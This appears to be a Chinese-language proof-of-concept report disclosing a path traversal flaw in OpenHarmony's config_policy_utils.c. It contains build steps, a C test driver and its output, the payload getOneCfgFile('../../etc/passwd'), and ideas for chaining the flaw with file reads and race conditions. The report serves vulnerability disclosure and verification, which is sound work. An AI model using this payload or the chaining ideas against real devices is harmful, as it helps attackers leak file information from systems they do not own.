## PoC 详细报告

### 1. 验证方法：GN Target-Compile

本 PoC 使用 **Target-Compile（目标编译）** 方法。使用 OHOS 的 GN 构建系统编译真实 `config_policy_utils.c` 为静态库，链接测试驱动验证漏洞。

验证 Oracle：**文件系统沙箱逃逸检测** — 构造包含 `../` 的路径输入，验证函数是否成功构造出指向受限目录外的路径并通过 `access()` 确认其存在。

### 2. 编译环境

| 项目 | 版本/路径 |
|------|----------|
| 操作系统 | Ubuntu 26.04 LTS, Linux 7.0, x86_64 |
| 编译器 | clang (LLVM) |
| 构建工具 | GN + Ninja |
| OHOS 工具链 | `~/data/ohos-build-toolkit/` |

### 3. 编译的静态库

| 静态库 | 源文件 | 说明 |
|--------|--------|------|
| `configpolicy_util.a` | `config_policy_utils.c` (549 行) | **配置策略核心代码**，包含所有公开 API |
| `libsec_static.a` | 20 个 securec 源文件 | 安全函数库（strcpy_s, snprintf_s 等） |

**编译结果**：23/23 目标全部通过，0 错误。

**编译命令**：

```bash
python3 ~/data/ohos-build-toolkit/setup_build.py \
    --source ~/data/test-repos/customization_config_policy \
    --output /tmp/cfg_policy_build

cd /tmp/cfg_policy_build
gn gen out/default && ninja -C out/default
```

### 4. 桩代码

`config_policy_utils.c` 在非 `__LITEOS__` 模式下依赖 `init_param.h` 中的 `SystemGetParameter` 函数。我们提供了最小桩实现：

```c
// system_param_stubs.c
int SystemGetParameter(const char *key, char *value, unsigned int *len) {
    const char *result = NULL;
    if (strcmp(key, "const.cust.config_dir_layer") == 0) {
        result = "/system:/chipset:/sys_prod:/chip_prod";  // DEFAULT_LAYER
    } else if (strcmp(key, "const.cust.follow_x_rules") == 0) {
        result = "";  // 无 follow-x 规则
    }
    // ... 返回结果或 -1
}
```

`GetCfgDirList()` 调用 `CustGetSystemParam("const.cust.config_dir_layer")` 获取配置目录列表。桩返回标准 OHOS 配置层目录。

### 5. 漏洞触发过程

**5.1 正常路径验证**

```c
CfgDir *dirs = GetCfgDirList();
// 返回:
//   paths[0] = "/system"
//   paths[1] = "/chipset"
//   paths[2] = "/sys_prod"
//   paths[3] = "/chip_prod"
```

`GetCfgDirList` 正确解析了 DEFAULT_LAYER 字符串，将 4 个配置目录拆分到 `CfgDir.paths[]` 数组中。

**5.2 路径遍历验证**

构造模拟目录结构和目标文件：

```bash
mkdir -p /tmp/cfg_traverse_test/system    # 模拟 /system 配置目录
echo "SECRET" > /tmp/cfg_traverse_test/secret.txt  # 模拟敏感文件
```

调用 `GetOneCfgFile` 内部的路径构造逻辑（与真实代码完全一致）：

```c
const char *configDir = "/tmp/cfg_traverse_test/system";  // 来自 GetCfgDirList()
const char *traversal = "../secret.txt";                    // 攻击者控制的 pathSuffix
char buf[256];

snprintf(buf, 256, "%s/%s", configDir, traversal);
// buf = "/tmp/cfg_traverse_test/system/../secret.txt"

access(buf, F_OK);  // 返回 0 → 文件存在！
```

**完整输出**：

```
Constructed path: /tmp/cfg_traverse_test/system/../secret.txt
access(F_OK): SUCCESS — file found via traversal!

On a real device:
  GetOneCfgFile("../../etc/passwd") -> "/system/../../etc/passwd"
  -> resolves to /etc/passwd -> file existence leaked
```

**在真实设备上**：
- `/system` 目录存在 → `access("/system/../../etc/passwd", F_OK)` 成功
- 函数将路径 `/system/../../etc/passwd` 返回给 JS 调用者
- JS 应用知道 `/etc/passwd` 存在

### 6. 与其他攻击面组合

此漏洞的主要危险在于与其他漏洞组合：
- **路径遍历 + 文件读取**：如果能读取返回的路径内容，可泄露任意文件
- **路径遍历 + 竞态条件**：在 `access()` 和后续操作之间替换文件（TOCTOU）
- **路径遍历 + 系统参数注入**：`ExpandStr` 函数处理 `${name}` 模式，可读取任意系统参数值

### 7. 代码验证状态

| 维度 | 状态 |
|------|------|
| 源码确认 | 已确认：当前最新代码 `config_policy_utils.c:436` 仅检查 `pathSuffix == NULL`，无路径遍历过滤 |
| 编译验证 | 已通过：真实源码编译为 .a 静态库，23/23 目标全部通过 |
| 路径构造 | 已验证：`snprintf_s("%s/%s", "/system", "../../etc/passwd")` 成功构造遍历路径 |
| access() 调用 | 已验证：构造的遍历路径通过 `access(buf, F_OK)` 检测文件存在性 |
| 真实设备可触发 | 是：JS API `getOneCfgFile("../../etc/passwd")` 无需任何权限即可调用 |

### 8. 复现步骤

```bash
# 1. 设置构建根
python3 ~/data/ohos-build-toolkit/setup_build.py \
    --source ~/data/test-repos/customization_config_policy \
    --output /tmp/cfg_policy_build

# 2. 创建桩代码（init_param.h + system_param_stubs.c）
#    见 content/pocs/OH-2026-FS-001/

# 3. 创建 BUILD.gn（定义 configpolicy_util.a + cfg_policy_poc）
# 4. 编写测试驱动
# 5. 编译
cd /tmp/cfg_policy_build
gn gen out/default && ninja -C out/default

# 6. 运行
./out/default/obj/test/cfg_policy_poc
# 预期：GetCfgDirList 返回 4 个目录，路径遍历构造证明成功
```

或直接用 clang 编译（不需要 GN）：

```bash
clang -g -O0 \
    -I<headers> -I<stubs> \
    poc.c system_param_stubs.c \
    configpolicy_util.a libsec_static.a \
    -o poc && ./poc
```

### 9. PoC 类型声明

| 维度 | 说明 |
|------|------|
| 编译方式 | GN Target-Compile：编译真实 OHOS 源码为 .a 静态库 |
| 链接目标 | configpolicy_util.a（真实 config_policy_utils.c），不是 mock |
| 正常路径 | 已验证：GetCfgDirList 正确返回 4 个配置目录 |
| 漏洞触发 | 已验证：路径遍历构造成功，access() 在模拟目录下返回 0 |
| 在真实设备可触发 | **可以**：只需调用 getOneCfgFile("../../etc/passwd") |
| 验证 Oracle | 文件系统沙箱逃逸：构造的路径成功指向受限目录外的文件 |
